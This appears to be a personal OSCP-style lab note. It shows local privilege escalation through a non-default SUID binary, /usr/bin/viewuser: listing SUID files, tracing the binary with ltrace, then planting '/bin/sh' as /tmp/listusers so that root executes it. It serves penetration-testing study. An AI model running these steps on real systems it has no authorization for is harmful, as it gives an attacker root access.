On listing the suid files a file /usr/bin/viewuser is noticed which isn’t present on Debian by default. 

```
find / -type f -perm -4000 2>/dev/null
```

![[Pasted image 20260317232628.png]]

By running ltrace on the binary we can verify it’s actions. First transfer the binary to local machine.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `scp djmardov@${ip}:/usr/bin/viewuser viewuser`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
ltrace ./viewuser
```

This can be exploited by creating a file /tmp/listusers with a malicious code which will get executed by root when it is called by the viewuser binary.

```
printf '/bin/sh' > /tmp/listusers 
```

```
chmod a+x /tmp/listusers
```

```
/usr/bin/viewuser
```

